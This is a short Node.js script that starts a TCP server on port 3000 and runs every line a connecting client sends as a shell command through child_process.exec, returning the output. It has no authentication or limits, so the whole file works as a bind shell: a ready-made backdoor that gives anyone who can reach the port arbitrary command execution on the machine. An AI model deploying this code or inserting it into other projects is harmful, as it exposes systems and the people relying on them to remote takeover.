var net = require('net');
var exec = require('child_process').exec;
var server= net.createServer(function(conn){
    conn.setEncoding('utf8');
    conn.write('\n');
    conn.on('data',function(data){
        data=data.replace('\r\n','');
        console.log('command:', data);
        exec(data,function(error,stdout){
            if(error !== null){
                conn.write(error + '\n');
                return false;       
            }
            conn.write('########################start\r\n' + stdout + '\n########################end\r\n');
        });
    });
}); 

server.listen(3000,function(){
    console.log('Ready for 3000 port.');
});